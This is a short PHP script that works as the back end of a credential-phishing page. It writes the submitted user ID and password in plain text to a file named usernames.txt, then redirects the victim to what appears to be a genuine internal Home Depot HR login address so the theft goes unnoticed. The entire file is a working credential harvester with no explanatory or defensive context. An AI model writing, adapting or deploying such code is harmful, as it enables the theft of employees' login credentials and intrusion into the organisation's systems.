<?php

file_put_contents("usernames.txt", "Account: " . $_POST['userId'] . " Pass: " . $_POST['Password'] . "\n", FILE_APPEND);
header('Location: http://hrwebwdc/V5homeDepot/Sistema/Validar/ValidarLogin/validaLogin.process?ReturnURL=/V5homeDepot/default.aspx');
?>
